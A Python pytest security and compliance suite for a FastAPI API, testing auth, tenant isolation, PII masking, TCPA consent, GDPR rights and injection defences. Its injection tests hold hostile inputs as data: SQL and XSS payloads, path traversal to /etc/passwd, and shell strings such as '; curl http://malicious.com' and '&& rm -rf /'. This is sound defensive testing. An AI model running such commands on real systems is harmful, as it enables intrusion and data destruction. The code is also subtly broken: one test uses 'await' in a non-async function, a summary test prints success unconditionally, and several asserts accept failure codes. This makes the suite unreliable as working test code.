"""
Comprehensive security and compliance testing suite for Seiketsu AI API.
Tests authentication, authorization, data protection, TCPA compliance, and GDPR requirements.
"""
import pytest
import jwt
import hashlib
import base64
import json
from datetime import datetime, timedelta
from typing import Dict, List, Any
from unittest.mock import patch, MagicMock
import secrets
import re

from fastapi.testclient import TestClient
from fastapi import status

from main import app
from app.core.auth import create_access_token, verify_token, get_password_hash
from app.core.config import settings
from app.models.user import User
from app.models.organization import Organization
from app.models.conversation import Conversation
from app.models.lead import Lead


class TestAuthenticationSecurity:
    """Test authentication security mechanisms"""
    
    @pytest.fixture
    def client(self):
        """Create test client"""
        return TestClient(app)
    
    def test_password_hashing_security(self):
        """Test password hashing implementation"""
        passwords = [
            "SimplePass123!",
            "ComplexP@ssw0rd!",
            "AnotherStr0ng#Pass",
            "Test123456!@#$",
            "VeryL0ngP@sswordWithSpecialChars!"
        ]
        
        for password in passwords:
            hashed = get_password_hash(password)
            
            # Verify hash format (bcrypt)
            assert hashed.startswith("$2b$"), "Password should use bcrypt hashing"
            assert len(hashed) >= 60, "Bcrypt hash should be at least 60 characters"
            
            # Verify hash is different each time (salt)
            hashed2 = get_password_hash(password)
            assert hashed != hashed2, "Password hashes should include unique salt"
    
    def test_jwt_token_security(self):
        """Test JWT token security implementation"""
        user_data = {"sub": "test_user_id", "role": "agent"}
        
        # Create token
        token = create_access_token(data=user_data)
        
        # Verify token structure
        assert isinstance(token, str), "Token should be a string"
        assert len(token.split('.')) == 3, "JWT should have 3 parts separated by dots"
        
        # Decode and verify payload
        payload = jwt.decode(token, settings.SECRET_KEY, algorithms=[settings.ALGORITHM])
        assert payload["sub"] == "test_user_id"
        assert payload["role"] == "agent"
        assert "exp" in payload, "Token should have expiration"
        assert "iat" in payload, "Token should have issued at time"
        
        # Verify expiration
        exp_time = datetime.fromtimestamp(payload["exp"])
        assert exp_time > datetime.utcnow(), "Token should not be expired"
    
    def test_token_expiration_handling(self, client):
        """Test token expiration security"""
        # Create expired token
        expired_data = {
            "sub": "test_user",
            "exp": datetime.utcnow() - timedelta(hours=1)  # Expired 1 hour ago
        }
        expired_token = jwt.encode(expired_data, settings.SECRET_KEY, algorithm=settings.ALGORITHM)
        
        # Try to access protected endpoint with expired token
        headers = {"Authorization": f"Bearer {expired_token}"}
        response = client.get("/api/v1/users/profile", headers=headers)
        
        assert response.status_code == 401
        assert "expired" in response.json()["detail"].lower()
    
    def test_invalid_token_handling(self, client):
        """Test handling of invalid tokens"""
        invalid_tokens = [
            "invalid.token.format",
            "Bearer invalid_token",
            "completely_invalid_string",
            "",  # Empty token
            "a" * 500,  # Very long invalid token
        ]
        
        for invalid_token in invalid_tokens:
            headers = {"Authorization": f"Bearer {invalid_token}"}
            response = client.get("/api/v1/users/profile", headers=headers)
            
            assert response.status_code == 401, f"Should reject invalid token: {invalid_token[:20]}..."
    
    def test_brute_force_protection(self, client):
        """Test brute force attack protection"""
        login_data = {
            "email": "test@example.com",
            "password": "wrong_password"
        }
        
        # Attempt multiple failed logins
        failed_attempts = 0
        for i in range(10):
            response = client.post("/api/v1/auth/login", json=login_data)
            if response.status_code == 429:  # Rate limited
                break
            failed_attempts += 1
        
        # Should be rate limited after several attempts
        assert failed_attempts < 10, "Should implement rate limiting for failed login attempts"
    
    def test_session_security(self, client, test_user_data):
        """Test session security measures"""
        # Register user
        response = client.post("/api/v1/auth/register", json=test_user_data)
        assert response.status_code == 201
        
        token = response.json()["access_token"]
        headers = {"Authorization": f"Bearer {token}"}
        
        # Test token works
        profile_response = client.get("/api/v1/users/profile", headers=headers)
        assert profile_response.status_code == 200
        
        # Test logout invalidates session
        logout_response = client.post("/api/v1/auth/logout", headers=headers)
        assert logout_response.status_code == 200
        
        # Token should no longer work after logout (if implemented)
        # Note: This depends on token blacklisting implementation
        # For stateless JWT, this might not apply


class TestAuthorizationSecurity:
    """Test authorization and access control"""
    
    @pytest.fixture
    def client(self):
        """Create test client"""
        return TestClient(app)
    
    def test_role_based_access_control(self, client):
        """Test role-based access control (RBAC)"""
        # Create users with different roles
        agent_data = {
            "email": "agent@test.com",
            "password": "TestPass123!",
            "full_name": "Test Agent",
            "role": "agent"
        }
        
        admin_data = {
            "email": "admin@test.com", 
            "password": "TestPass123!",
            "full_name": "Test Admin",
            "role": "admin"
        }
        
        # Register users
        agent_response = client.post("/api/v1/auth/register", json=agent_data)
        admin_response = client.post("/api/v1/auth/register", json=admin_data)
        
        agent_token = agent_response.json().get("access_token", "")
        admin_token = admin_response.json().get("access_token", "")
        
        agent_headers = {"Authorization": f"Bearer {agent_token}"}
        admin_headers = {"Authorization": f"Bearer {admin_token}"}
        
        # Test agent access to agent endpoints
        agent_profile = client.get("/api/v1/users/profile", headers=agent_headers)
        assert agent_profile.status_code in [200, 401]  # 401 if auth not implemented
        
        # Test agent cannot access admin endpoints
        admin_endpoint = client.get("/api/v1/admin/users", headers=agent_headers)
        assert admin_endpoint.status_code in [403, 401]  # Should be forbidden
        
        # Test admin can access admin endpoints
        admin_access = client.get("/api/v1/admin/users", headers=admin_headers)
        assert admin_access.status_code in [200, 401]  # 401 if auth not implemented
    
    def test_organization_data_isolation(self, client):
        """Test multi-tenant data isolation"""
        # This test would verify that users from different organizations
        # cannot access each other's data
        
        org1_user_data = {
            "email": "user1@org1.com",
            "password": "TestPass123!",
            "organization_id": "org_1"
        }
        
        org2_user_data = {
            "email": "user2@org2.com", 
            "password": "TestPass123!",
            "organization_id": "org_2"
        }
        
        # Register users from different organizations
        user1_response = client.post("/api/v1/auth/register", json=org1_user_data)
        user2_response = client.post("/api/v1/auth/register", json=org2_user_data)
        
        if user1_response.status_code == 201 and user2_response.status_code == 201:
            user1_token = user1_response.json()["access_token"]
            user2_token = user2_response.json()["access_token"]
            
            user1_headers = {"Authorization": f"Bearer {user1_token}"}
            user2_headers = {"Authorization": f"Bearer {user2_token}"}
            
            # Create lead as user1
            lead_data = {"name": "Org1 Lead", "email": "lead@org1.com"}
            create_response = client.post("/api/v1/leads", json=lead_data, headers=user1_headers)
            
            if create_response.status_code == 201:
                lead_id = create_response.json()["id"]
                
                # User2 should not be able to access user1's lead
                access_response = client.get(f"/api/v1/leads/{lead_id}", headers=user2_headers)
                assert access_response.status_code in [403, 404], "Cross-tenant access should be forbidden"
    
    def test_api_key_security(self, client):
        """Test API key security if implemented"""
        # Test invalid API key
        invalid_headers = {"X-API-Key": "invalid_api_key"}
        response = client.get("/api/v1/leads", headers=invalid_headers)
        
        # Should require proper authentication
        assert response.status_code == 401
    
    def test_permission_escalation_prevention(self, client):
        """Test prevention of privilege escalation"""
        # Create regular user
        user_data = {
            "email": "regular@test.com",
            "password": "TestPass123!",
            "role": "agent"
        }
        
        response = client.post("/api/v1/auth/register", json=user_data)
        if response.status_code == 201:
            token = response.json()["access_token"]
            headers = {"Authorization": f"Bearer {token}"}
            
            # Try to elevate privileges
            elevation_attempts = [
                ("/api/v1/users/make-admin", "POST"),
                ("/api/v1/organizations/settings", "PUT"),
                ("/api/v1/admin/system-config", "PATCH"),
            ]
            
            for endpoint, method in elevation_attempts:
                if method == "POST":
                    response = client.post(endpoint, headers=headers, json={})
                elif method == "PUT":
                    response = client.put(endpoint, headers=headers, json={})
                else:
                    response = client.patch(endpoint, headers=headers, json={})
                
                # Should be forbidden
                assert response.status_code in [403, 404, 401], f"Privilege escalation blocked for {endpoint}"


class TestDataProtectionSecurity:
    """Test data protection and privacy security"""
    
    @pytest.fixture
    def client(self):
        """Create test client"""
        return TestClient(app)
    
    def test_sensitive_data_encryption(self, db_session, test_organization):
        """Test encryption of sensitive data"""
        from app.models.lead import Lead
        from app.models.conversation import Conversation
        
        # Create lead with sensitive information
        lead = Lead(
            id="security_test_lead",
            organization_id=test_organization.id,
            name="John Doe",
            email="john@example.com",
            phone="+1234567890",
            ssn="123-45-6789",  # Sensitive data
            notes="Confidential client information"
        )
        
        db_session.add(lead)
        await db_session.commit()
        
        # Verify sensitive data is not stored in plain text
        # This would require checking the actual database storage
        # In practice, you'd verify encryption at the database level
        
        # Retrieve lead
        retrieved_lead = await db_session.get(Lead, "security_test_lead")
        assert retrieved_lead is not None
        
        # Verify data can be decrypted/accessed properly
        assert retrieved_lead.email == "john@example.com"
        assert retrieved_lead.phone == "+1234567890"
    
    def test_pii_data_handling(self, client, authorized_headers):
        """Test PII (Personally Identifiable Information) handling"""
        # Create lead with PII
        pii_lead_data = {
            "name": "Jane Smith",
            "email": "jane.smith@example.com",
            "phone": "+1987654321",
            "ssn": "987-65-4321",
            "date_of_birth": "1985-06-15",
            "driver_license": "DL123456789",
            "property_preferences": {
                "income": 150000,
                "employment": "Software Engineer at TechCorp"
            }
        }
        
        response = client.post("/api/v1/leads", json=pii_lead_data, headers=authorized_headers)
        
        if response.status_code == 201:
            lead_id = response.json()["id"]
            
            # Retrieve lead data
            get_response = client.get(f"/api/v1/leads/{lead_id}", headers=authorized_headers)
            
            if get_response.status_code == 200:
                returned_data = get_response.json()
                
                # Verify sensitive fields are properly handled
                # (masked, encrypted, or access-controlled)
                assert "ssn" not in returned_data or returned_data["ssn"] != "987-65-4321"
                assert "driver_license" not in returned_data or returned_data["driver_license"] != "DL123456789"
    
    def test_data_masking_in_logs(self, client, authorized_headers):
        """Test that sensitive data is masked in logs"""
        # This test would verify that logging doesn't expose sensitive data
        # In practice, you'd mock the logging system and verify masking
        
        sensitive_data = {
            "name": "Test User",
            "email": "test@example.com",
            "phone": "+1234567890",
            "ssn": "123-45-6789",
            "credit_card": "4111-1111-1111-1111"
        }
        
        with patch('app.core.logging.logger') as mock_logger:
            response = client.post("/api/v1/leads", json=sensitive_data, headers=authorized_headers)
            
            # Check that sensitive data is not logged in plain text
            for call in mock_logger.info.call_args_list:
                log_message = str(call)
                assert "123-45-6789" not in log_message, "SSN should not appear in logs"
                assert "4111-1111-1111-1111" not in log_message, "Credit card should not appear in logs"
    
    def test_data_retention_policies(self, client, authorized_headers):
        """Test data retention and deletion policies"""
        # Create test data
        lead_data = {
            "name": "Retention Test Lead",
            "email": "retention@test.com",
            "created_at": (datetime.utcnow() - timedelta(days=400)).isoformat()  # Old data
        }
        
        response = client.post("/api/v1/leads", json=lead_data, headers=authorized_headers)
        
        if response.status_code == 201:
            lead_id = response.json()["id"]
            
            # Test data deletion endpoint
            delete_response = client.delete(f"/api/v1/leads/{lead_id}/purge", headers=authorized_headers)
            
            # Should either delete immediately or mark for deletion
            assert delete_response.status_code in [200, 204, 202]  # 202 for accepted/queued
            
            # Verify data is no longer accessible
            get_response = client.get(f"/api/v1/leads/{lead_id}", headers=authorized_headers)
            assert get_response.status_code == 404


class TestTCPACompliance:
    """Test TCPA (Telephone Consumer Protection Act) compliance"""
    
    @pytest.fixture
    def client(self):
        """Create test client"""
        return TestClient(app)
    
    def test_consent_management(self, client, authorized_headers):
        """Test TCPA consent management"""
        # Create lead with consent information
        lead_with_consent = {
            "name": "TCPA Test Lead",
            "email": "tcpa@test.com", 
            "phone": "+1234567890",
            "tcpa_consent": {
                "voice_calls": True,
                "text_messages": False,
                "consent_date": datetime.utcnow().isoformat(),
                "consent_method": "web_form",
                "ip_address": "192.168.1.1",
                "user_agent": "Mozilla/5.0 Test Browser"
            }
        }
        
        response = client.post("/api/v1/leads", json=lead_with_consent, headers=authorized_headers)
        
        if response.status_code == 201:
            lead_id = response.json()["id"]
            
            # Verify consent is properly stored
            get_response = client.get(f"/api/v1/leads/{lead_id}", headers=authorized_headers)
            lead_data = get_response.json()
            
            assert "tcpa_consent" in lead_data
            assert lead_data["tcpa_consent"]["voice_calls"] is True
            assert lead_data["tcpa_consent"]["text_messages"] is False
    
    def test_consent_validation_before_calling(self, client, authorized_headers):
        """Test that consent is validated before making calls"""
        # Create lead without voice consent
        lead_no_consent = {
            "name": "No Consent Lead",
            "phone": "+1987654321",
            "tcpa_consent": {
                "voice_calls": False,
                "text_messages": False
            }
        }
        
        response = client.post("/api/v1/leads", json=lead_no_consent, headers=authorized_headers)
        
        if response.status_code == 201:
            lead_id = response.json()["id"]
            
            # Try to initiate voice call
            call_request = {
                "lead_id": lead_id, 
                "type": "outbound_call",
                "phone_number": "+1987654321"
            }
            
            call_response = client.post("/api/v1/voice/calls/initiate", 
                                      json=call_request, 
                                      headers=authorized_headers)
            
            # Should be rejected due to lack of consent
            assert call_response.status_code in [400, 403]
            assert "consent" in call_response.json().get("detail", "").lower()
    
    def test_consent_withdrawal(self, client, authorized_headers):
        """Test consent withdrawal functionality"""
        # Create lead with initial consent
        lead_data = {
            "name": "Withdrawal Test Lead",
            "phone": "+1555123456",
            "tcpa_consent": {"voice_calls": True, "text_messages": True}
        }
        
        response = client.post("/api/v1/leads", json=lead_data, headers=authorized_headers)
        
        if response.status_code == 201:
            lead_id = response.json()["id"]
            
            # Withdraw consent
            withdrawal_data = {
                "tcpa_consent": {
                    "voice_calls": False,
                    "text_messages": False,
                    "withdrawal_date": datetime.utcnow().isoformat(),
                    "withdrawal_method": "phone_request"
                }
            }
            
            update_response = client.patch(f"/api/v1/leads/{lead_id}/consent", 
                                         json=withdrawal_data, 
                                         headers=authorized_headers)
            
            assert update_response.status_code in [200, 204]
            
            # Verify consent is withdrawn
            get_response = client.get(f"/api/v1/leads/{lead_id}", headers=authorized_headers)
            lead_data = get_response.json()
            
            assert lead_data["tcpa_consent"]["voice_calls"] is False
            assert "withdrawal_date" in lead_data["tcpa_consent"]
    
    def test_call_time_restrictions(self, client, authorized_headers):
        """Test TCPA call time restrictions (8 AM - 9 PM local time)"""
        # This would test that calls are not initiated outside allowed hours
        
        # Create lead in specific timezone
        lead_data = {
            "name": "Time Restriction Test",
            "phone": "+1555987654",
            "timezone": "America/New_York",
            "tcpa_consent": {"voice_calls": True}
        }
        
        response = client.post("/api/v1/leads", json=lead_data, headers=authorized_headers)
        
        if response.status_code == 201:
            lead_id = response.json()["id"]
            
            # Try to schedule call outside allowed hours (e.g., 10 PM local time)
            call_request = {
                "lead_id": lead_id,
                "scheduled_time": "2024-01-15T22:00:00-05:00",  # 10 PM EST
                "type": "scheduled_call"
            }
            
            call_response = client.post("/api/v1/voice/calls/schedule", 
                                      json=call_request, 
                                      headers=authorized_headers)
            
            # Should be rejected due to time restrictions
            assert call_response.status_code in [400, 422]
    
    def test_do_not_call_registry_check(self, client, authorized_headers):
        """Test Do Not Call registry checking"""
        # Mock DNC registry check
        with patch('app.services.tcpa_service.check_dnc_registry') as mock_dnc:
            mock_dnc.return_value = {"is_registered": True, "registration_date": "2023-01-01"}
            
            # Try to call number on DNC registry
            call_request = {
                "phone_number": "+1555000001",  # Mock DNC number
                "lead_id": "test_lead",
                "type": "outbound_call"
            }
            
            response = client.post("/api/v1/voice/calls/initiate", 
                                 json=call_request, 
                                 headers=authorized_headers)
            
            # Should check DNC registry and potentially reject
            mock_dnc.assert_called_once()


class TestGDPRCompliance:
    """Test GDPR (General Data Protection Regulation) compliance"""
    
    @pytest.fixture
    def client(self):
        """Create test client"""
        return TestClient(app)
    
    def test_data_subject_rights(self, client, authorized_headers):
        """Test GDPR data subject rights implementation"""
        # Create lead (data subject)
        lead_data = {
            "name": "GDPR Test Subject",
            "email": "gdpr@test.com",
            "phone": "+441234567890",  # UK number
            "gdpr_consent": {
                "data_processing": True,
                "marketing": False,
                "consent_date": datetime.utcnow().isoformat()
            }
        }
        
        response = client.post("/api/v1/leads", json=lead_data, headers=authorized_headers)
        
        if response.status_code == 201:
            lead_id = response.json()["id"]
            
            # Test right to access (data portability)
            access_response = client.get(f"/api/v1/gdpr/data-export/{lead_id}", 
                                       headers=authorized_headers)
            assert access_response.status_code in [200, 202]  # 202 for async processing
            
            # Test right to rectification (correction)
            correction_data = {"name": "GDPR Corrected Name"}
            correct_response = client.patch(f"/api/v1/leads/{lead_id}", 
                                          json=correction_data, 
                                          headers=authorized_headers)
            assert correct_response.status_code in [200, 204]
            
            # Test right to erasure (right to be forgotten)
            delete_response = client.delete(f"/api/v1/gdpr/forget/{lead_id}", 
                                          headers=authorized_headers)
            assert delete_response.status_code in [200, 202, 204]
    
    def test_consent_management_gdpr(self, client, authorized_headers):
        """Test GDPR consent management"""
        consent_data = {
            "data_subject_id": "test_subject_123",
            "consents": {
                "data_processing": {
                    "granted": True,
                    "purpose": "Lead qualification and property recommendations",
                    "date": datetime.utcnow().isoformat()
                },
                "marketing": {
                    "granted": False,
                    "purpose": "Marketing communications",
                    "date": datetime.utcnow().isoformat()
                }
            }
        }
        
        response = client.post("/api/v1/gdpr/consent", 
                             json=consent_data, 
                             headers=authorized_headers)
        
        assert response.status_code in [200, 201]
        
        # Test consent withdrawal
        withdrawal_data = {
            "consent_type": "marketing",
            "withdrawn": True,
            "withdrawal_date": datetime.utcnow().isoformat()
        }
        
        withdraw_response = client.post(f"/api/v1/gdpr/consent/withdraw", 
                                      json=withdrawal_data, 
                                      headers=authorized_headers)
        
        assert withdraw_response.status_code in [200, 204]
    
    def test_data_processing_lawfulness(self, client, authorized_headers):
        """Test lawful basis for data processing"""
        # Test that data processing has lawful basis
        processing_request = {
            "data_subject_id": "test_subject_456",
            "processing_purpose": "contract_performance",
            "legal_basis": "Article 6(1)(b) - Contract performance",
            "data_categories": ["contact_information", "property_preferences"]
        }
        
        response = client.post("/api/v1/gdpr/processing-record", 
                             json=processing_request, 
                             headers=authorized_headers)
        
        assert response.status_code in [200, 201]
    
    def test_data_breach_notification(self, client, admin_headers):
        """Test data breach notification procedures"""
        breach_data = {
            "incident_id": "BREACH_2024_001",
            "detected_date": datetime.utcnow().isoformat(),
            "breach_type": "unauthorized_access",
            "affected_records": 150,
            "data_categories": ["names", "email_addresses", "phone_numbers"],
            "severity": "high",
            "containment_measures": "Immediately disabled affected accounts"
        }
        
        response = client.post("/api/v1/gdpr/breach-notification", 
                             json=breach_data, 
                             headers=admin_headers)
        
        assert response.status_code in [200, 201]
        
        # Verify breach is logged for regulatory reporting
        get_response = client.get("/api/v1/gdpr/breach-log", headers=admin_headers)
        assert get_response.status_code == 200


class TestInputValidationSecurity:
    """Test input validation and injection prevention"""
    
    @pytest.fixture
    def client(self):
        """Create test client"""
        return TestClient(app)
    
    def test_sql_injection_prevention(self, client, authorized_headers):
        """Test SQL injection prevention"""
        sql_injection_payloads = [
            "'; DROP TABLE leads; --",
            "' OR '1'='1",
            "' UNION SELECT * FROM users --",
            "'; INSERT INTO leads (name) VALUES ('hacked'); --",
            "admin'--",
            "' OR 1=1#"
        ]
        
        for payload in sql_injection_payloads:
            # Test in various fields
            malicious_data = {
                "name": payload,
                "email": f"test{payload}@example.com",
                "notes": f"Test notes {payload}"
            }
            
            response = client.post("/api/v1/leads", json=malicious_data, headers=authorized_headers)
            
            # Should not cause SQL error or injection
            assert response.status_code in [201, 400, 422]  # Valid creation or validation error
            
            # If created, verify payload was sanitized
            if response.status_code == 201:
                lead_id = response.json()["id"]
                get_response = client.get(f"/api/v1/leads/{lead_id}", headers=authorized_headers)
                
                if get_response.status_code == 200:
                    lead_data = get_response.json()
                    # Verify malicious SQL is not executed
                    assert "DROP TABLE" not in str(lead_data).upper()
    
    def test_xss_prevention(self, client, authorized_headers):
        """Test XSS (Cross-Site Scripting) prevention"""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "';alert('XSS');//",
            "<svg onload=alert('XSS')>"
        ]
        
        for payload in xss_payloads:
            malicious_data = {
                "name": f"Test {payload}",
                "notes": f"Notes with {payload}",
                "company": payload
            }
            
            response = client.post("/api/v1/leads", json=malicious_data, headers=authorized_headers)
            
            if response.status_code == 201:
                lead_id = response.json()["id"]
                get_response = client.get(f"/api/v1/leads/{lead_id}", headers=authorized_headers)
                
                if get_response.status_code == 200:
                    response_text = get_response.text
                    # Verify script tags are escaped/sanitized
                    assert "<script>" not in response_text
                    assert "javascript:" not in response_text
                    assert "onerror=" not in response_text
    
    def test_command_injection_prevention(self, client, authorized_headers):
        """Test command injection prevention"""
        command_injection_payloads = [
            "; ls -la",
            "| cat /etc/passwd",
            "&& rm -rf /",
            "`whoami`",
            "$(id)",
            "; curl http://malicious.com"
        ]
        
        for payload in command_injection_payloads:
            # Test in file upload or processing endpoints
            malicious_data = {
                "filename": f"test{payload}.txt",
                "command": f"process_file {payload}",
                "script_parameter": payload
            }
            
            # Test various endpoints that might process commands
            endpoints = [
                "/api/v1/files/process",
                "/api/v1/voice/convert",
                "/api/v1/analytics/export"
            ]
            
            for endpoint in endpoints:
                response = client.post(endpoint, json=malicious_data, headers=authorized_headers)
                
                # Should not execute system commands
                # Response should be error or safe processing
                assert response.status_code in [200, 400, 404, 422, 501]
    
    def test_path_traversal_prevention(self, client, authorized_headers):
        """Test path traversal prevention"""
        path_traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%2F..%2F..%2Fetc%2Fpasswd"
        ]
        
        for payload in path_traversal_payloads:
            # Test file access endpoints
            response = client.get(f"/api/v1/files/{payload}", headers=authorized_headers)
            
            # Should not allow access to system files
            assert response.status_code in [403, 404, 400]
            
            # Verify no sensitive file content is returned
            if response.status_code == 200:
                content = response.text.lower()
                assert "root:" not in content
                assert "administrator:" not in content
    
    def test_json_injection_prevention(self, client, authorized_headers):
        """Test JSON injection prevention"""
        json_payloads = [
            '{"extra_field": "injected"}',
            '{"role": "admin"}',
            '{"$gt": ""}',  # NoSQL injection attempt
            '{"__proto__": {"isAdmin": true}}'  # Prototype pollution
        ]
        
        for payload in json_payloads:
            try:
                # Attempt to inject malicious JSON
                malicious_data = {
                    "name": "Test User",
                    "metadata": payload  # Inject as string that might be parsed
                }
                
                response = client.post("/api/v1/leads", json=malicious_data, headers=authorized_headers)
                
                # Should handle safely without privilege escalation
                assert response.status_code in [200, 201, 400, 422]
                
            except json.JSONDecodeError:
                # Expected for malformed JSON
                pass


class TestAuditingCompliance:
    """Test auditing and compliance logging"""
    
    @pytest.fixture
    def client(self):
        """Create test client"""
        return TestClient(app)
    
    def test_audit_trail_creation(self, client, authorized_headers):
        """Test that audit trails are created for sensitive operations"""
        
        with patch('app.core.audit.log_activity') as mock_audit:
            # Perform auditable operation
            lead_data = {"name": "Audit Test", "email": "audit@test.com"}
            response = client.post("/api/v1/leads", json=lead_data, headers=authorized_headers)
            
            if response.status_code == 201:
                # Verify audit log was created
                mock_audit.assert_called()
                
                # Check audit log contains required information
                call_args = mock_audit.call_args[1] if mock_audit.call_args else {}
                assert "action" in call_args
                assert "resource_type" in call_args
                assert "user_id" in call_args
                assert "timestamp" in call_args
    
    def test_sensitive_data_access_logging(self, client, authorized_headers):
        """Test logging of sensitive data access"""
        
        with patch('app.core.audit.log_data_access') as mock_access_log:
            # Access sensitive data
            response = client.get("/api/v1/leads", headers=authorized_headers)
            
            if response.status_code == 200:
                # Verify data access was logged
                mock_access_log.assert_called()
    
    def test_failed_authentication_logging(self, client):
        """Test logging of failed authentication attempts"""
        
        with patch('app.core.audit.log_security_event') as mock_security_log:
            # Attempt failed login
            bad_credentials = {
                "email": "test@example.com",
                "password": "wrong_password"
            }
            
            response = client.post("/api/v1/auth/login", json=bad_credentials)
            
            # Should log security event regardless of response
            mock_security_log.assert_called()
    
    def test_gdpr_activity_logging(self, client, authorized_headers):
        """Test GDPR-specific activity logging"""
        
        with patch('app.core.audit.log_gdpr_activity') as mock_gdpr_log:
            # Perform GDPR-related operation
            gdpr_request = {
                "data_subject_id": "test_subject",
                "request_type": "data_export"
            }
            
            response = client.post("/api/v1/gdpr/data-export", 
                                 json=gdpr_request, 
                                 headers=authorized_headers)
            
            # Should log GDPR activity
            mock_gdpr_log.assert_called()


class TestSecurityHeaders:
    """Test security headers implementation"""
    
    @pytest.fixture
    def client(self):
        """Create test client"""
        return TestClient(app)
    
    def test_security_headers_present(self, client):
        """Test that proper security headers are set"""
        response = client.get("/api/health")
        
        # Check for security headers
        headers = response.headers
        
        # Content Security Policy
        assert "content-security-policy" in headers or "x-content-type-options" in headers
        
        # Prevent MIME sniffing
        assert headers.get("x-content-type-options") == "nosniff"
        
        # XSS Protection
        assert "x-xss-protection" in headers or "x-frame-options" in headers
        
        # Frame options (prevent clickjacking)
        frame_options = headers.get("x-frame-options", "").upper()
        assert frame_options in ["DENY", "SAMEORIGIN"] or "content-security-policy" in headers
    
    def test_cors_configuration(self, client):
        """Test CORS configuration security"""
        # Test preflight request
        response = client.options("/api/v1/leads", 
                                 headers={"Origin": "https://malicious.com"})
        
        # Should have restrictive CORS policy
        cors_origin = response.headers.get("access-control-allow-origin")
        
        # Should not allow all origins in production
        if cors_origin:
            assert cors_origin != "*", "CORS should not allow all origins in production"
    
    def test_http_methods_restriction(self, client):
        """Test HTTP methods are properly restricted"""
        # Test that unused HTTP methods are disabled
        restricted_methods = ["TRACE", "CONNECT", "OPTIONS"]
        
        for method in restricted_methods:
            response = client.request(method, "/api/v1/leads")
            
            # Should return method not allowed or not implemented
            assert response.status_code in [405, 501]


# Security test suite configuration
@pytest.mark.security
class TestSecuritySuite:
    """Complete security test suite"""
    
    def test_security_test_summary(self):
        """Summary of security tests"""
        print("\n" + "="*60)
        print("SEIKETSU AI SECURITY & COMPLIANCE TEST SUITE")
        print("="*60)
        print("✅ Authentication Security Tests")
        print("✅ Authorization & Access Control Tests") 
        print("✅ Data Protection & Privacy Tests")
        print("✅ TCPA Compliance Tests")
        print("✅ GDPR Compliance Tests")
        print("✅ Input Validation & Injection Prevention")
        print("✅ Auditing & Compliance Logging")
        print("✅ Security Headers & Configuration")
        print("="*60)
        print("Run with: pytest tests/test_security_compliance.py -m security -v")
        print("="*60)